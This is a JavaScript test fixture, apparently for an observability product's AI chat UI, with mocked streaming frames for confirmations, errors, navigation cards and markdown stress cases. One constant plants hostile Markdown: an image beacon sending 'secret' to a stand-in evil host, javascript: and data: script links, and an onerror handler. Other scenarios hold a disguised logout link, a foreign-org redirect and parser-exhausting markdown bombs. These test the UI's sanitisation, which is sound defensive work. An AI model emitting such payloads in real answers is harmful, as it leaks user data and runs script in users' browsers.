// Copyright 2026 OpenObserve Inc.
// Payload shapes follow ai_chat_share.ts, useAiChat.ts, useChatHistory.ts and the o2-ai SSE events.

const US = 1000; // ms -> µs multiplier
const NOW = Date.now();

/** UUIDv7 whose first 48 bits are `ms`, as the UI derives chat ids from them. */
export function uuidv7(ms, salt = 0) {
  const ts = Math.floor(ms).toString(16).padStart(12, "0");
  const rnd = (n) =>
    Array.from({ length: n }, (_, i) => ((salt * 7919 + i * 104729 + ms) % 16).toString(16)).join("");
  return `${ts.slice(0, 8)}-${ts.slice(8, 12)}-7${rnd(3)}-a${rnd(3)}-${rnd(12)}`;
}

// Config gating: fields flipped on /config and /api/{org}/config responses.
export const CONFIG_PATCH = {
  ai_enabled: true, // gates every AI affordance (Header.vue:693, HomeView.vue:268, O2AIContextAddBtn.vue:4 ...)
  ai_chat_persistence_enabled: true, // server history + sharing (useAiChat.ts chatHistoryServer, chatShare.ts:103)
  public_ai_chat_enabled: true, // public link option in the share dialog (chatShare.ts:106)
  public_ai_chat_max_expiry_days: 30,
};

// SSE frame builders (o2-ai EventType, src/server/constants.py:27-46).
const f = {
  status: (message = "processing") => ({ type: "status", message }),
  title: (title) => ({ type: "title", title }),
  toolCall: (tool, message, context = {}, call_id) => ({ type: "tool_call", tool, message, context, ...(call_id && { call_id }) }),
  toolResult: (tool, extra = {}) => ({ type: "tool_result", tool, success: true, message: `${tool} completed successfully`, ...extra }),
  delta: (content) => ({ type: "message_delta", content }),
  usage: () => ({
    type: "usage",
    usage: { input_tokens: 18342, output_tokens: 612, prompt_tokens: 18342, completion_tokens: 612, tokens_in: 18342, tokens_out: 612, total_tokens: 18954, cached_tokens: 12288, llm_calls: 3, cost: 0.0213 },
  }),
  complete: (history = []) => ({
    type: "complete",
    history,
    compacted: false,
    usage: { input_tokens: 18342, output_tokens: 612, total_tokens: 18954, cached_tokens: 12288, llm_calls: 3, cost: 0.0213 },
    trace_id: "4bf92f3577b34da6a3ce929d0e0e4736",
  }),
  error: (message, extra = {}) => ({ type: "error", error_type: "unknown", message, recoverable: true, ...extra }),
};

/** Split text into chunks of ~`size` chars on word boundaries, like token streaming. */
function chunk(text, size = 18) {
  const out = [];
  let buf = "";
  for (const part of text.split(/(\s+)/)) {
    buf += part;
    if (buf.length >= size) {
      out.push(buf);
      buf = "";
    }
  }
  if (buf) out.push(buf);
  return out;
}

export const ANSWER_MD = `## Checkout 5xx spike — what happened

Between **12:40 and 12:55** the \`checkout\` service returned **214 errors** (HTTP 500–503). Almost all of them trace back to the \`payments\` upstream resetting connections.

**Key findings**
- 92% of errors carry \`upstream payments returned 50x: connection reset by peer\`
- p95 latency on \`checkout\` rose from **118 ms to 1.9 s** during the window
- Only pods \`checkout-7d9f3c-*\` in namespace \`prod\` are affected
- No deploy happened in the window; the last rollout was 3 h earlier

Run this to see the breakdown yourself:

\`\`\`sql
SELECT service_name, http_status, count(*) AS errors,
       approx_percentile_cont(latency_ms, 0.95) AS p95_ms
FROM "default"
WHERE level = 'error'
GROUP BY service_name, http_status
ORDER BY errors DESC
\`\`\`

| Service | Status | Errors | p95 (ms) |
|---|---|---:|---:|
| checkout | 502 | 121 | 1,942 |
| checkout | 503 | 64 | 1,877 |
| cart | 500 | 29 | 1,811 |

**Next step:** check the \`payments\` connection pool — the reset rate matches its max-connections ceiling of 50.`;

const SQL_CTX = {
  stream_name: "default",
  stream_type: "logs",
  sql: "SELECT service_name, http_status, count(*) AS errors FROM \"default\" WHERE level = 'error' GROUP BY service_name, http_status ORDER BY errors DESC",
  start_time: (NOW - 15 * 60_000) * US,
  end_time: NOW * US,
};

/** A full successful agent turn: status, tools, markdown answer, usage, complete. */
export function completeFrames(answer = ANSWER_MD, title = "Checkout 5xx spike in prod") {
  return [
    f.status("processing"),
    f.title(title),
    f.toolCall("StreamList", "Listing streams", { stream_type: "logs" }, "call_1"),
    f.toolResult("StreamList", { call_id: "call_1", summary: "Found 3 log streams" }),
    f.toolCall("StreamSchema", "Fetching stream schema", { stream_name: "default", stream_type: "logs" }, "call_2"),
    f.toolResult("StreamSchema", { call_id: "call_2", summary: "11 fields" }),
    f.toolCall("SearchSQL", "Querying logs", { request_body: { query: { sql: SQL_CTX.sql, start_time: SQL_CTX.start_time, end_time: SQL_CTX.end_time } }, stream_name: "default", sql: SQL_CTX.sql }, "call_3"),
    f.toolResult("SearchSQL", {
      call_id: "call_3",
      summary: "4 rows",
      call_args: { stream_name: "default", stream_type: "logs", sql: SQL_CTX.sql, start_time: SQL_CTX.start_time, end_time: SQL_CTX.end_time },
      response: { hits: [{ service_name: "checkout", http_status: 502, errors: 121 }], total: 4 },
    }),
    ...chunk(answer).map(f.delta),
    f.usage(),
    f.complete([{ role: "assistant", content: answer }]),
  ];
}

const PROMQL_ANSWER = `Here is a PromQL query for **p95 request latency by service** over 5-minute windows:

\`\`\`promql
histogram_quantile(0.95,
  sum by (le, service_name) (rate(http_server_duration_bucket[5m])))
\`\`\`

- \`rate(...[5m])\` smooths scrape jitter
- Group by \`le\` is required for \`histogram_quantile\``;

const VRL_ANSWER = `This VRL parses an nginx access log line into structured fields:

\`\`\`vrl
. = parse_nginx_log!(.message, "combined")
.status = to_int!(.status)
.is_error = .status >= 500
\`\`\`

I validated it against 5 sample events — all parsed.`;

// WP-06: the `99` §1.2 planted Markdown payloads, as one answer.
const PLANTED_MARKDOWN = [
  "Here is what I found.",
  "",
  "![x](https://evil.example/p.gif?d=secret)",
  "",
  "[click](javascript:alert(1)) · [x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "",
  '<a href="https://evil.example" target="_self">same tab</a> <img src=x onerror="window.__pwned=1">',
  "",
  "[Open dashboard](/web/logout) · [See](/web/ai/shared/abc) · [Logs](/web/logs?sql=c2VsZWN0&run=true)",
  "",
  "Read [the docs](https://openobserve.ai/docs/).",
].join("\n");

const CITED_ANSWER = `The \`checkout\` errors trace back to \`payments\` resetting connections [^call_3].

92% of them carry \`connection reset by peer\` [^call_3], across 3 log streams [^call_1].`;

const NAV_LOGS_TARGET = {
  stream: "default",
  stream_type: "logs",
  query: "SELECT * FROM \"default\" WHERE level = 'error' AND service_name = 'payments'",
  sql_mode: true,
  from: (NOW - 3_600_000) * US,
  to: NOW * US,
};

export const SCENARIOS = {
  complete: { frames: completeFrames(), delayMs: 25 },
  // Same turn but slow, so a screenshot can catch it mid-stream (tool running, text half-typed).
  slow: { frames: completeFrames(), delayMs: 450 },
  // Tool call that never finishes within the capture window.
  hang_tool: {
    frames: [f.status(), f.title("Investigate checkout errors"), f.toolCall("SearchSQL", "Querying logs", { sql: SQL_CTX.sql }, "call_9")],
    delayMs: 200,
    holdOpen: true,
  },
  error: {
    frames: [
      f.status(),
      f.toolCall("SearchSQL", "Querying logs", { sql: SQL_CTX.sql }, "call_e1"),
      f.toolResult("SearchSQL", { call_id: "call_e1", success: false, error_type: "query_error", message: "Search field not found: latency" }),
      f.error("The language model provider is overloaded. Please try again in a moment.", { error_type: "llm_overload", suggestion: "Retry in a few seconds, or pick a smaller time range." }),
    ],
    delayMs: 60,
  },
  confirmation: {
    frames: [
      f.status(),
      f.title("Delete stale alert"),
      ...chunk("I found the alert **checkout-latency-old** (disabled for 41 days). Deleting it needs your approval.").map(f.delta),
      {
        type: "confirmation_required",
        tool: "o2_delete",
        args: { items: [{ resource_type: "alert", name: "checkout-latency-old", id: "2Yx9alert", params: {} }] },
        message: 'Do you really want to delete the "checkout-latency-old" alert?',
      },
      { waitForConfirm: true },
      f.toolResult("o2_delete", { summary: "Deleted 1 alert" }),
      ...chunk("Done — the alert **checkout-latency-old** was deleted.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // A delete batch of five alerts (o2-ai events.build_delete_confirmation_event).
  confirmation_batch: {
    frames: [
      f.status(),
      f.title("Delete stale alerts"),
      ...chunk("Five alerts have been disabled for over a month. Deleting them needs your approval.").map(f.delta),
      {
        type: "confirmation_required",
        tool: "o2_delete",
        args: {
          items: ["checkout-latency-old", "payments-5xx-staging", "cart-p95", "search-errors", "login-latency"].map((name, i) => ({
            resource_type: "alert",
            name,
            id: `stale${i + 1}`,
            params: {},
          })),
        },
        message: "Do you really want to delete these 5 resources?",
      },
      { waitForConfirm: true },
      ...chunk("Done.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // An opencode permission (events._permission_event): the turn pauses on it; o2-ai auto-denies at 30 s.
  permission_card: {
    frames: [
      f.status(),
      f.title("List pods"),
      ...chunk("I need to look at the pods in prod.").map(f.delta),
      {
        type: "confirmation_required",
        tool: "bash",
        args: { permission_id: "per_e2e", detail: "kubectl get pods -n prod" },
        message: "The assistant wants to run: kubectl get pods -n prod",
      },
      { waitForConfirm: true },
      ...chunk("Three pods are running.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // A typed update card with before/after.
  update_card: {
    frames: [
      f.status(),
      f.title("Raise the alert threshold"),
      ...chunk("I can raise the threshold of **checkout-latency** from 1 s to 2 s.").map(f.delta),
      {
        type: "confirmation_required",
        tool: "o2_UpdateAlert",
        call_id: "call_upd1",
        kind: "update",
        operation: "Update alert",
        targets: [{ type: "alert", id: "2Yx9alert", name: "checkout-latency" }],
        before: { threshold: "1s", period: "5m" },
        after: { threshold: "2s", period: "5m" },
        impact: ["Pages 3 on-call users"],
        message: "Update alert checkout-latency?",
      },
      { waitForConfirm: true },
      ...chunk("Updated.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // A CLI toolset command that needs confirmation (agent/clis/handler.py).
  command_card: {
    frames: [
      f.status(),
      f.title("Restart the checkout pods"),
      ...chunk("I'll restart the checkout deployment with the acme-cli toolset.").map(f.delta),
      {
        type: "confirmation_required",
        tool: "acme-cli",
        args: { command: "kubectl rollout restart deploy/checkout -n prod", toolset: "acme-cli" },
        message: "The assistant wants to run: acme-cli kubectl rollout restart deploy/checkout -n prod",
      },
      { waitForConfirm: true },
      ...chunk("Restarted.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // A change no card asked about: the turn ran a mutating tool directly.
  resource_changed_unreviewed: {
    frames: [
      f.status(),
      f.title("Raise the alert threshold"),
      f.toolCall("o2_UpdateAlert", "Updating alert", { name: "checkout-latency" }, "call_u1"),
      f.toolResult("o2_UpdateAlert", { call_id: "call_u1" }),
      { type: "resource_changed", resource_type: "alert", id: "2Yx9alert", op: "update" },
      ...chunk("I raised the threshold of **checkout-latency** to 2 s.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  navigation: {
    frames: [
      f.status(),
      f.title("Open payments errors in Logs"),
      ...chunk("I prepared a logs query for **payments errors in the last hour**.").map(f.delta),
      {
        type: "navigation_action",
        resource_type: "logs",
        action: "load_query",
        label: "View payments errors in Logs",
        target: { stream: "default", stream_type: "logs", query: "SELECT * FROM \"default\" WHERE level = 'error' AND service_name = 'payments'", sql_mode: true, from: (NOW - 3_600_000) * US, to: NOW * US },
      },
      { waitForConfirm: true },
      f.complete(),
    ],
    delayMs: 40,
  },
  // Natural-language query mode (useNLQuery.ts) extracts SQL from the streamed text.
  nl_sql: {
    frames: [
      f.status("Generating query"),
      f.toolCall("StreamSchema", "Fetching stream schema", { stream_name: "default" }),
      f.toolResult("StreamSchema"),
      ...chunk("```sql\nSELECT service_name, count(*) AS errors FROM \"default\" WHERE level = 'error' GROUP BY service_name ORDER BY errors DESC\n```").map(f.delta),
      f.complete(),
    ],
    delayMs: 60,
  },
  // The same proposal over the harness's ingested stream, so Accept keeps the Logs stream selection.
  nl_sql_e2e: {
    frames: [
      f.status("Generating query"),
      ...chunk("```sql\nSELECT service_name, count(*) AS errors FROM \"e2e_automate\" WHERE level = 'error' GROUP BY service_name\n```").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // The inline helper's "needs chat" outcome: prose with no query and no question.
  nl_needs_chat: {
    frames: [
      f.status("Thinking"),
      ...chunk("Comparing this week's error rate with last week's takes two queries and a chart, which one query cannot answer.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // The analysis stream drops after two chunks with no terminal frame; the run finishes on the server.
  rca_dropped: {
    frames: [
      { type: "start" },
      { type: "chunk", content: "## Root cause\n\n" },
      { type: "chunk", content: "The **checkout** service started timing out at 10:02 " },
    ],
    delayMs: 200,
  },
  // The incident analysis route (`/alerts/incidents/{id}/rca?stream=true`): start, chunk… complete.
  rca_stream: {
    frames: [
      { type: "start" },
      ...[
        "## Root cause\n\n",
        "The **checkout** service started timing out at 10:02 ",
        "after its database pool hit the 50-connection limit.\n\n",
        "## Evidence\n\n",
        "- p95 latency rose from 180 ms to 4.2 s on `checkout`\n",
        "- `db_pool_wait` errors began at 10:01 on all three pods\n",
        "- No deploy in the hour before the spike\n\n",
        "## Next steps\n\n",
        "1. Raise the pool limit or shed load on `checkout`\n",
        "2. Alert on pool saturation before latency moves\n",
      ].map((content) => ({ type: "chunk", content })),
      { type: "complete" },
    ],
    delayMs: 350,
  },
  promql: { frames: completeFrames(PROMQL_ANSWER, "PromQL for p95 latency by service"), delayMs: 20 },
  vrl: {
    frames: [
      f.status(),
      f.title("VRL to parse nginx logs"),
      f.toolCall("testFunction", "Validating VRL", { vrl: ". = parse_nginx_log!(.message, \"combined\")" }, "call_v"),
      f.toolResult("testFunction", { call_id: "call_v", summary: "5/5 events parsed" }),
      ...chunk(VRL_ANSWER).map(f.delta),
      f.complete(),
    ],
    delayMs: 20,
  },
  // WP-03 (honest-turns §0.4, 99 §5). `tailFrames` is what the B-03 tail resumes with when `tailEnabled` is on.
  drop_mid_stream: {
    frames: [f.status(), ...chunk(ANSWER_MD).slice(0, 3).map(f.delta)],
    tailFrames: [...chunk(ANSWER_MD).slice(3).map(f.delta), f.complete()],
    delayMs: 40,
  },
  drop_before_first_byte: { frames: [], delayMs: 10 },
  // Keepalive comments only, for 35 s after one tool call: no progress, but alive.
  keepalive_stall: {
    frames: [f.status(), f.toolCall("SearchSQL", "Querying logs", { stream_name: "default" }, "call_k"), ...Array(7).fill({ keepalive: true })],
    delayMs: 5000,
    holdOpen: true,
  },
  tool_interrupted_by_error: {
    frames: [
      f.status(),
      f.toolCall("SearchSQL", "Querying logs", { stream_name: "default", sql: SQL_CTX.sql }, "call_i"),
      f.error("The AI service is experiencing high load. Please try again.", { error_type: "llm_overload" }),
    ],
    delayMs: 60,
  },
  persistence_failed: {
    frames: [
      f.status(),
      ...chunk("Between 12:40 and 12:55 the checkout service returned 214 errors.").map(f.delta),
      { ...f.complete(), persisted: false },
      { type: "error", code: "persistence_failed", reason: "write_failed", error: "This response could not be saved to the chat history.", message: "This response could not be saved to the chat history.", recoverable: false },
    ],
    delayMs: 40,
  },
  empty_turn: { frames: [f.status(), { type: "complete", history: [], compacted: false }], delayMs: 40 },
  owner_race_no_code: {
    frames: [
      f.status(),
      { type: "error", message: "This conversation is being served by another o2-ai replica and cannot be continued here.", recoverable: true, category: "session_owner_unavailable" },
    ],
    delayMs: 40,
  },
  cancelled_frame: {
    frames: [f.status(), ...chunk("Looking at the checkout errors now.").map(f.delta), { type: "cancelled" }],
    delayMs: 60,
  },
  long_answer: { frames: [f.status(), ...longAnswerDeltas(), f.complete()], delayMs: 8 },
  stale_epoch: {
    frames: [f.status(), { type: "error", message: "A newer turn of this conversation has started.", recoverable: false, category: "stale_epoch", code: "stale_epoch" }],
    delayMs: 40,
  },
  // A single line over the client's 1 MiB guard (99 T8).
  oversized_frame: { frames: [f.status(), { oversized: true }], delayMs: 40 },
  // Lines that are not JSON or not a known frame: counted and ignored, the answer still lands.
  garbage_body: {
    frames: [f.status(), { raw: "data: this is not json" }, { raw: 'data: {"type":"made_up_frame"}' }, ...chunk("Still answered.").map(f.delta), f.complete()],
    delayMs: 40,
  },
  // WP-06: the `99` §1.2 Markdown payloads in one answer (SEC-01, SEC-02, SEC-04); see fixtures/payloads.mjs.
  payloads_markdown: { frames: [f.status(), f.delta(PLANTED_MARKDOWN), f.complete()], delayMs: 40 },
  // WP-06 PERF-02 variant: a 400-delta unlabelled fence, then a 400-delta ```sql fence.
  long_answer_fenced: { frames: [f.status(), ...fencedDeltas(), f.complete()], delayMs: 6 },
  // WP-06 B-02 lifecycle frames as o2-ai PR #167 sends them (retrying, compacting, permission_denied).
  retrying_frame: {
    frames: [f.status(), { type: "retrying", attempt: 2, reason: "rate_limit", retry_after: 20 }],
    delayMs: 40,
    holdOpen: true,
  },
  compacting_frame: { frames: [f.status(), { type: "compacting" }], delayMs: 40, holdOpen: true },
  permission_denied_frame: {
    frames: [
      f.status(),
      f.toolCall("o2_UpdateAlert", "Updating alert", { name: "checkout-5xx" }, "call_9"),
      { type: "step", id: "call_9", call_id: "call_9", kind: "write", label: "Updating alert", params: { call_id: "call_9" }, state: "failed" },
      { type: "permission_denied", tool: "o2_UpdateAlert", policy: "opencode" },
      ...chunk("I couldn't change the alert: the policy blocks it. Here is what to change instead.").map(f.delta),
      f.complete(),
    ],
    delayMs: 40,
  },
  // WP-06 round 4: independent-verify-2 W1's bomb (a backtick in an HTML attribute hides 60k of `*a `), streamed in 4k deltas.
  markdown_bomb: { frames: [f.status(), ...sliced(htmlAttrBomb(60_000), 4_000).map(f.delta), f.complete()], delayMs: 30 },
  // W2: a 2,500-column table, the shape that runs the parser out of memory; it must render as plain text.
  markdown_bomb_table: { frames: [f.status(), ...sliced(wideTable(2_500, 3_333), 4_000).map(f.delta), f.complete()], delayMs: 30 },
  // Round 5 (independent-verify-3): X1 a reference link repeated into megabytes of HTML.
  markdown_bomb_links: { frames: [f.status(), ...sliced(refLinkBomb(20_000, 3_000), 4_000).map(f.delta), f.complete()], delayMs: 30 },
  // X2: wide tables inside a quote and after a fence opened in a quote, which skipped the round-4 cap.
  markdown_bomb_quote_table: {
    frames: [f.status(), ...sliced(quoteTable(1_000, 2_000) + "\n\n> ```\n\n" + wideTable(1_000, 2_000), 4_000).map(f.delta), f.complete()],
    delayMs: 30,
  },
  // X3: thirty 2,000-character `*a:` bombs, each its own text block between tool steps.
  markdown_bomb_small_blocks: { frames: [f.status(), ...smallBlockBombs(30)], delayMs: 10 },
  // X4: fences the main thread used to highlight: java (not registered) and a long javascript one.
  markdown_bomb_code: {
    frames: [f.status(), f.delta("```java\n" + "$".repeat(20_000) + "\n```\n\n```javascript\n" + "a".repeat(9_000) + "\n```\n"), f.complete()],
    delayMs: 30,
  },
  // Round 6 (independent-verify-4 Y1): tables marked builds but the old count missed, each under the 20k cap; every block is text.
  markdown_bomb_table_rows: {
    frames: [f.status(), ...textBlocks([gridTable(2, 1) + "\t\n".repeat(2_400), "h\n:-\n" + "a\n".repeat(9_990), (gridTable(2, 600) + "\n").repeat(2)])],
    delayMs: 10,
  },
  // Y2, one answer each as independent-verify-4 measured them: a realistic 19k answer and 20k of list items, formatted; 200k of short lines, as text.
  markdown_dense_answer: { frames: [f.status(), ...textBlocks([realisticAnswer(19_000)])], delayMs: 10 },
  markdown_dense_list: { frames: [f.status(), ...textBlocks(["- a\n".repeat(4_990)])], delayMs: 10 },
  markdown_dense_lines: { frames: [f.status(), ...textBlocks(["a\n".repeat(99_000)])], delayMs: 10 },
  // The three together in one answer: measured and reported, not asserted (see the round-6 evidence).
  markdown_dense: {
    frames: [f.status(), ...textBlocks([realisticAnswer(19_000), "- a\n".repeat(4_990), "a\n".repeat(99_000)])],
    delayMs: 10,
  },
  // Round 7 (independent-verify-5 Z1): a link whose escaped href is ten times its 2,000 raw characters, which looped the part splitter and crashed the tab.
  markdown_bomb_long_link: {
    frames: [f.status(), ...sliced("See the results below.\n\n[x](https://e.com/?" + "&".repeat(2_000) + ")\n\n**Done.**", 500).map(f.delta), f.complete()],
    delayMs: 30,
  },
  // Follow-up D2: the server's id contract, as the real stack sent it. `turn_started` and `status` carry -1, several frames share a seq's id, and an id-only message marks a seq complete.
  server_ids: {
    frames: [
      { type: "turn_started", turn_id: "turn", sseId: -1 },
      { ...f.status(), sseId: -1 },
      { ...f.delta("alpha"), sseId: -1 },
      { boundary: 0 },
      { ...f.delta(" beta"), sseId: 0 },
      { ...f.delta(" gamma."), sseId: 0 },
      { boundary: 1 },
      { ...f.delta(" Then a second sentence: delta epsilon."), sseId: 1 },
      { ...f.complete(), sseId: 1 },
      { boundary: 2 },
    ],
    delayMs: 20,
  },
  // Round 8 (independent-verify-6 Q7): a broken image whose 19,900-character alt laid out as one run.
  markdown_bomb_alt: {
    frames: [f.status(), ...textBlocks(["Before.\n\n![" + "x".repeat(19_900) + "](data:image/png;base64,AAAA)\n\n**After.**"])],
    delayMs: 10,
  },
  // Z2: a realistic answer of 150 query examples, each with its SQL fence, and 2,000 one-line fences.
  markdown_query_examples: { frames: [f.status(), ...textBlocks([queryExamples(150)])], delayMs: 10 },
  markdown_bomb_fences: { frames: [f.status(), ...textBlocks(["```\na\n```\n".repeat(2_000)])], delayMs: 10 },
  // Y3 / F14: a 2,000-cell table formatted as plain cells, and the 19,999-cell table of round 5 as text.
  markdown_table_cap: { frames: [f.status(), ...textBlocks([gridTable(10, 199), gridTable(8, 2_499)])], delayMs: 10 },
  // The `complete` turn with claim markers citing the SearchSQL step.
  cite: { frames: completeFrames(CITED_ANSWER, "Cited checkout errors"), delayMs: 20 },
  // A navigation frame that ends the turn (no confirmation wait), so the link card is the answer's.
  navigation_card: {
    frames: [
      f.status(),
      ...chunk("I prepared a logs query for **payments errors in the last hour**.").map(f.delta),
      { type: "navigation_action", resource_type: "logs", action: "load_query", label: "View payments errors in Logs", target: NAV_LOGS_TARGET },
      f.complete(),
    ],
    delayMs: 30,
  },
  // The label and `target.path` point elsewhere; the card must open the dashboard of `resource_type`.
  nav_path_override: {
    frames: [
      f.status(),
      ...chunk("Here is the dashboard.").map(f.delta),
      { type: "navigation_action", resource_type: "dashboard", action: "navigate_direct", label: "Sign out now", target: { path: "/web/logout", dashboard_id: "d_checkout", folder: "default", name: "Checkout" } },
      f.complete(),
    ],
    delayMs: 30,
  },
  // The target names another org; the card keeps the session's.
  nav_org_override: {
    frames: [
      f.status(),
      ...chunk("Here is the alert.").map(f.delta),
      { type: "navigation_action", resource_type: "alert", action: "navigate_direct", label: "Open", target: { alert_id: "a_latency", query: { org_identifier: "evil_org", folder: "default" } } },
      f.complete(),
    ],
    delayMs: 30,
  },
  // An answer link to the assistant route that tries to stage a chip.
  assistant_stage_link: {
    frames: [f.status(), f.delta("Continue in [this chat](/web/assistant/0190f3a0-0000-7000-8000-000000000abc?assistant=1&object=log_row&ref=evil)."), f.complete()],
    delayMs: 30,
  },
  // A findings frame that could not confirm a cause.
  findings_inconclusive: {
    frames: [
      f.status(),
      f.toolCall("SearchSQL", "Querying logs", { stream_name: "default", sql: SQL_CTX.sql }, "call_3"),
      f.toolResult("SearchSQL", { call_id: "call_3", summary: { count: 0, took: 120 }, call_args: SQL_CTX }),
      ...chunk("I could not tie the errors to one cause.").map(f.delta),
      { type: "findings", likely_cause: "", confidence: "inconclusive", evidence: [{ text: "No errors in payments in the window", call_id: "call_3", kind: "verified" }], ruled_out: ["recent deploy"], unknowns: ["payments pool metrics"], next_steps: ["enable pool metrics"] },
      f.complete(),
    ],
    delayMs: 30,
  },
  // A valid findings frame, and one missing likely_cause and confidence.
  findings_valid: {
    frames: [
      f.status(),
      f.toolCall("SearchSQL", "Querying logs", { stream_name: "default", sql: SQL_CTX.sql }, "call_3"),
      f.toolResult("SearchSQL", { call_id: "call_3", summary: { count: 4, took: 380 }, call_args: SQL_CTX }),
      ...chunk("The payments pool ran out of connections.").map(f.delta),
      { type: "findings", likely_cause: "payments connection pool exhausted", confidence: "medium", evidence: [{ text: "92% of errors are connection resets from payments", call_id: "call_3", kind: "verified" }, { text: "the reset rate matches the pool ceiling of 50", kind: "inferred" }], ruled_out: ["recent deploy"], unknowns: ["payments pool metrics"], next_steps: ["check the payments max-connections setting"] },
      f.complete(),
    ],
    delayMs: 30,
  },
  findings_invalid: {
    frames: [f.status(), ...chunk("The payments pool ran out of connections.").map(f.delta), { type: "findings", evidence: [] }, f.complete()],
    delayMs: 30,
  },
  // Two queries over different windows.
  multi_window: {
    frames: [
      f.status(),
      f.toolCall("SearchSQL", "Querying logs", { stream_name: "default", sql: SQL_CTX.sql }, "call_2"),
      f.toolResult("SearchSQL", { call_id: "call_2", summary: { count: 4, took: 380 }, call_args: SQL_CTX }),
      f.toolCall("SearchSQL", "Querying logs", { stream_name: "default", sql: SQL_CTX.sql }, "call_3"),
      f.toolResult("SearchSQL", { call_id: "call_3", summary: { count: 9, took: 410 }, call_args: { ...SQL_CTX, start_time: SQL_CTX.start_time - 3_600_000 * US } }),
      ...chunk("Both windows agree.").map(f.delta),
      f.complete(),
    ],
    delayMs: 30,
  },
};

function queryExamples(count) {
  let text = "Here are queries you can run:\n\n";
  for (let i = 0; i < count; i++)
    text += `**${i + 1}. Errors on host node-${i % 9}**\n\n\`\`\`sql\nSELECT count(*) FROM "default" WHERE level = 'error' AND host = 'node-${i % 9}'\n\`\`\`\n\n`;
  return text;
}

// Each text streamed in 4k deltas as its own block, split from the next by a tool step.
function textBlocks(texts) {
  const frames = [];
  texts.forEach((text, i) => {
    frames.push(...sliced(text, 4_000).map(f.delta));
    if (i === texts.length - 1) return;
    frames.push(f.toolCall("StreamList", "Listing streams", { stream_type: "logs" }, `call_t${i}`));
    frames.push(f.toolResult("StreamList", { call_id: `call_t${i}`, summary: "ok" }));
  });
  return [...frames, f.complete()];
}

function gridTable(columns, rows) {
  return "| " + "h | ".repeat(columns) + "\n| " + "- | ".repeat(columns) + "\n" + ("| " + "val | ".repeat(columns) + "\n").repeat(rows);
}

// Sections of headings, emphasis, a link, nested and ordered lists, a small table, a SQL fence and a quoted claim.
function realisticAnswer(chars) {
  const section = (i) =>
    `## Section ${i}: error rate analysis\n\nThe **ingester** on \`node-${i}\` reported a spike in [errors](https://openobserve.ai/docs/${i}) between 10:00 and 10:15. See the *details* below:\n\n` +
    `- p95 latency rose to ${i * 3} ms\n- 5xx count: ${i * 7}\n  - mostly \`502\` from the proxy\n  - some \`504\`\n1. Check the stream\n2. Restart the pod\n\n` +
    `| host | errors | p95 |\n| --- | ---: | ---: |\n| a-${i} | ${i} | 12 |\n| b-${i} | ${i * 2} | 15 |\n\n` +
    `\`\`\`sql\nSELECT histogram(_timestamp) AS t, count(*) AS c FROM "default" WHERE level = 'error' AND host = 'a-${i}' GROUP BY t ORDER BY t\n\`\`\`\n\n` +
    `> Note: this is a quoted remark with a [^call_${i}] claim marker.\n\n`;
  let text = "";
  for (let i = 0; text.length + section(i).length <= chars; i++) text += section(i);
  return text;
}

function refLinkBomb(urlChars, uses) {
  return "[a]: https://e.com/" + "x".repeat(urlChars) + "\n\n" + "[a] ".repeat(uses);
}

function quoteTable(columns, rows) {
  return "> |" + "a|".repeat(columns) + "\n> |" + "-|".repeat(columns) + "\n" + "> |x\n".repeat(rows);
}

function smallBlockBombs(count) {
  const frames = [];
  for (let i = 0; i < count; i++) {
    frames.push(f.delta("*a:".repeat(666)));
    frames.push(f.toolCall("StreamList", "Listing streams", { stream_type: "logs" }, `call_b${i}`));
    frames.push(f.toolResult("StreamList", { call_id: `call_b${i}`, summary: "ok" }));
  }
  return [...frames, f.complete()];
}

function htmlAttrBomb(n) {
  return 'x <b title="`">' + "*a ".repeat(Math.floor(n / 3)) + "`x";
}

function wideTable(columns, rows) {
  return "|" + "a|".repeat(columns) + "\n|" + "-|".repeat(columns) + "\n" + "|x\n".repeat(rows);
}

function sliced(text, size) {
  const out = [];
  for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size));
  return out;
}

/** Two long fences streamed delta by delta: unlabelled first, then SQL (round 2 E-19). */
function fencedDeltas() {
  const deltas = [f.delta("Plain fence:\n\n```\n")];
  for (let i = 0; i < 400; i++) deltas.push(f.delta(`line ${i} of raw output\n`));
  deltas.push(f.delta("```\n\nSQL fence:\n\n```sql\n"));
  for (let i = 0; i < 400; i++) deltas.push(f.delta(`SELECT ${i} AS n UNION ALL\n`));
  deltas.push(f.delta("SELECT 400\n```\n"));
  return deltas;
}

/** 400 deltas carrying three tables and two code blocks (HT-08, `00` §14). */
function longAnswerDeltas() {
  const table = (n) => `\n\n| Service | Errors ${n} |\n|---|---:|\n| checkout | ${100 + n} |\n| cart | ${20 + n} |\n\n`;
  const code = (n) => `\n\n\`\`\`sql\nSELECT service_name, count(*) FROM "default" -- block ${n}\nGROUP BY service_name\n\`\`\`\n\n`;
  const deltas = [];
  for (let i = 0; i < 400; i++) {
    if (i === 80 || i === 200 || i === 320) deltas.push(f.delta(table(i)));
    else if (i === 140 || i === 260) deltas.push(f.delta(code(i)));
    else deltas.push(f.delta(`word${i} `));
  }
  return deltas;
}

// HTTP-level scenarios: the chat_stream request itself is refused before streaming.
export const HTTP_SCENARIOS = {
  // The incident route's own 400 refusals (src/api/management/src/request/alerts/incidents.rs).
  rca_in_progress: { status: 400, body: { code: 400, message: "Analysis already in progress" } },
  rca_priority_off: { status: 400, body: { code: 400, message: "AI SRE is turned off for this incident's priority" } },
  rca_not_enabled: { status: 400, body: { code: 400, message: "RCA is not enabled" } },
  // 412: free credits depleted, consent needed (src/api/management/src/request/ai/chat.rs:228-236)
  consent: {
    status: 412,
    body: {
      code: 412,
      message: "Paid usage requires organization consent.",
      error_type: "paid_overage_consent_required",
      consent: overageStatus({ effective: false, billing_status: "eligible" }),
    },
  },
  // 402: credits exhausted, no overage possible (src/core/src/trial_quota.rs:1324-1328)
  credits_exhausted: {
    status: 402,
    body: { code: 402, message: "AI credit limit exhausted. Contact your account manager to add more credits." },
  },
  subscription_required: {
    status: 402,
